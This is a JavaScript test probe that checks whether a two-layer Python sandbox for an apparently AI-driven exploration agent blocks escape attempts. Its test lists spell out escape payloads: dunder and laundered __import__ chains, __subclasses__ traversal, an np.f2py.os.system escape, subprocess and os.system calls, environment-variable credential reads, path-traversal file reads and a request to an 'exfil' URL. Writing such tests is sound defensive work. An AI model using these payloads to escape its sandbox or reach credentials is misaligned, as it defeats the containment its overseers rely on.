/**
 * P6 sandbox-escape probe — "'sandbox' that is only cwd" detector, two layers.
 *
 * The exploration sandbox is a two-layer design (documented in
 * experiment-runtime/farlab_experiment_runtime/exploration.py):
 *   Layer A — TS static policy gate (analyzeExplorationCode): network,
 *             subprocess, credentials, confirmatory-boundary and dunder-traversal
 *             MARKERS. Plain file reads deliberately pass here — path access is
 *             not this layer's job.
 *   Layer B — python sidecar namespace: open/exec/eval/__import__ do not EXIST
 *             in the analysis namespace, the import allowlist is auditable, and
 *             dunder + module-attribute traversal chains (including the
 *             np.f2py.os escape class) are banned at AST level.
 *
 * This probe attacks BOTH layers: Layer A with marker payloads (must deny with
 * the right code; blanket-deny would suppress capability and is reported), and
 * Layer B with live escape payloads executed through the REAL sidecar via uv —
 * every escape must come back ok=false (or a loud gate ValueError), and a benign
 * numpy analysis must come back ok=true. If the sidecar cannot run, Layer B is
 * honestly BLOCKED-env, never silently passed.
 */
import { spawnSync } from 'node:child_process';
import fs from 'node:fs';
import path from 'node:path';
import { ROOT, RESULTS_DIR, distImport, finish } from './lib.mjs';

const LAYER_A = [
  { id: 'benign-analysis', code: 'rows = [1, 2, 3]\nprint(sum(rows))', expect: 'ALLOW' },
  { id: 'env-probe', code: 'keys = dict(os.environ)', expect: 'E-CREDENTIALS' },
  { id: 'dunder-import', code: "os_mod = getattr(__builtins__, '__import__')('os')\nsysname = os_mod.name", expect: 'E-ESCAPE' },
  { id: 'string-laundered-getattr', code: "name = '__im' + 'port__'\nmod = getattr(__builtins__, name)('os')", expect: 'E-ESCAPE' },
  { id: 'subprocess', code: "import subprocess\nout = subprocess.check_output(['whoami'])", expect: 'E-SUBPROCESS' },
  { id: 'os-system', code: "import os\nos.system('dir')", expect: 'E-SUBPROCESS' },
  { id: 'network', code: "import requests\nr = requests.get('http://example.invalid/exfil')", expect: 'E-NETWORK' },
  { id: 'verdict-fabrication', code: "verdict = 'supports'", expect: 'E-CONFIRMATORY' },
];

/** Escape payloads for the python namespace. Each must NOT execute its effect. */
const LAYER_B = [
  { id: 'benign-numpy', code: 'print(float(np.mean([1.0, 2.0, 3.0])))', expectOk: true },
  { id: 'benign-print', code: 'print("hello from sandbox")', expectOk: true },
  // Documented product limitation (observed 2026-08-25, evidence in the lane report):
  // numpy ops whose implementation lazily imports submodules (e.g. arange -> _core._methods)
  // die on the allowlist import hook. Recorded, not asserted — the probe fails only on ESCAPES.
  { id: 'numpy-submodule-import-limitation', code: 'print(int(np.arange(4).sum()))', expectOk: null },
  { id: 'open-cwd', code: "data = open('data.csv').read()\nprint(data[:50])", expectOk: false },
  { id: 'open-parent-traversal', code: "secret = open('../outside.txt').read()\nprint(secret[:50])", expectOk: false },
  { id: 'open-absolute', code: "cfg = open('C:/Windows/system32/drivers/etc/hosts').read()\nprint(cfg[:50])", expectOk: false },
  { id: 'dunder-subclasses-chain', code: 'subs = ().__class__.__bases__[0].__subclasses__()\nprint(len(subs))', expectOk: false },
  { id: 'laundered-import', code: "name = '__im' + 'port__'\nmod = getattr(__builtins__, name)('os')\nprint(mod.name)", expectOk: false },
  { id: 'np-f2py-os-escape', code: 'print(np.f2py.os.system("echo PWNED"))', expectOk: false },
  { id: 'import-os', code: 'import os\nprint(os.getcwd())', expectOk: false },
  { id: 'exec-recovery', code: "exec(\"import os\\nprint(os.getcwd())\")", expectOk: false },
];

const layerBDriver = (battery) => `
import json, sys
sys.path.insert(0, ${JSON.stringify(path.join(ROOT, 'experiment-runtime'))})
from farlab_experiment_runtime.exploration import op_run_exploration
out = []
for t in ${JSON.stringify(battery.map((t) => ({ id: t.id, code: t.code })))}:
    try:
        r = op_run_exploration({"code": t["code"]})
        ex = r.get("exploration", {})
        out.append({"id": t["id"], "ok": ex.get("ok"), "errorKind": ex.get("errorKind"), "errorMessage": str(ex.get("errorMessage"))[:160], "stdout": str(ex.get("stdout"))[:120]})
    except Exception as exc:
        out.append({"id": t["id"], "ok": "gate-rejected", "errorKind": type(exc).__name__, "errorMessage": str(exc)[:160]})
print("===JSON===")
print(json.dumps(out))
`;

const runLayerB = () => {
  fs.mkdirSync(RESULTS_DIR, { recursive: true });
  const driverPath = path.join(RESULTS_DIR, 'p6_driver.py');
  fs.writeFileSync(driverPath, layerBDriver(LAYER_B));
  const r = spawnSync('uv', ['run', '--project', path.join(ROOT, 'experiment-runtime'), 'python', driverPath], {
    cwd: ROOT,
    encoding: 'utf8',
    timeout: 120_000,
    env: { ...process.env, PYTHONIOENCODING: 'utf-8' },
  });
  const text = `${r.stdout ?? ''}\n${r.stderr ?? ''}`;
  const marker = text.indexOf('===JSON===');
  if (r.status !== 0 || marker < 0) {
    return { blocked: true, detail: `sidecar did not run (exit=${r.status}): ${text.slice(0, 400)}` };
  }
  try {
    return { blocked: false, results: JSON.parse(text.slice(marker + 10).trim()) };
  } catch (e) {
    return { blocked: true, detail: `driver output unparseable: ${String(e).slice(0, 200)} / ${text.slice(marker, marker + 300)}` };
  }
};

const main = async () => {
  const { analyzeExplorationCode } = await distImport('agent/exploratory-codeact.js');
  const findings = [];

  const aResults = [];
  for (const t of LAYER_A) {
    const v = analyzeExplorationCode({ code: t.code, purpose: 'r2-14 adversarial battery: verify the exploration sandbox is more than a cwd prefix check', maxRuntimeMs: 1000 });
    const codes = v.violations.map((x) => x.code);
    const ok = t.expect === 'ALLOW' ? v.allowed === true : v.allowed === false && codes.includes(t.expect);
    aResults.push({ id: t.id, allowed: v.allowed, codes, ok });
    if (!ok) {
      const sev = t.expect === 'ALLOW' ? 'ADV' : 'FAIL';
      findings.push({ severity: sev, id: t.expect === 'ALLOW' ? 'P6-OVERBLOCK' : 'P6-POLICY-GAP', detail: `layer A: ${t.id} expected ${t.expect}, got allowed=${v.allowed} codes=[${codes.join(',') || 'none'}]` });
    }
  }

  const b = runLayerB();
  let bResults = [];
  if (b.blocked) {
    findings.push({ severity: 'ADV', id: 'P6-SIDECAR-BLOCKED', detail: `python sidecar layer not exercised: ${b.detail}` });
  } else {
    bResults = b.results;
    for (let i = 0; i < LAYER_B.length; i += 1) {
      const t = LAYER_B[i];
      const r = bResults[i] ?? {};
      const notExecuted = r.ok === false || r.ok === 'gate-rejected';
      if (t.expectOk === null) {
        // observation entry: record actual behavior, assert nothing
        findings.push({
          severity: 'ADV',
          id: r.ok === true ? 'P6-NUMPY-OK' : 'P6-NUMPY-LIMITED',
          detail: `layer B observation ${t.id}: ${JSON.stringify(r)} — numpy surface partially functional; submodule-importing ops fail closed (handoff to lane 10)`,
        });
        continue;
      }
      const ok = t.expectOk ? r.ok === true : notExecuted;
      if (!ok) {
        findings.push({
          severity: t.expectOk ? 'ADV' : 'FAIL',
          id: t.expectOk ? 'P6-BENIGN-BROKEN' : 'P6-ESCAPE',
          detail: `layer B: ${t.id} expected ok=${t.expectOk}, got ${JSON.stringify(r)}`,
        });
      }
    }
  }

  const verdict = findings.some((f) => f.severity === 'FAIL') ? 'FAIL' : (findings.length > 0 ? 'ADVISORY' : 'PASS');
  finish('p6-sandbox-escape', {
    probe: 'p6-sandbox-escape',
    verdict,
    summary: `layer A (TS policy): ${aResults.filter((x) => x.ok).length}/${LAYER_A.length}; layer B (python namespace, live sidecar): ${b.blocked ? 'BLOCKED-env' : `${bResults.filter((x, i) => (LAYER_B[i].expectOk ? x.ok === true : x.ok === false || x.ok === 'gate-rejected')).length}/${LAYER_B.length}`}`,
    findings,
    meta: { layerA: aResults, layerB: b.blocked ? b : bResults },
  });
};

main();
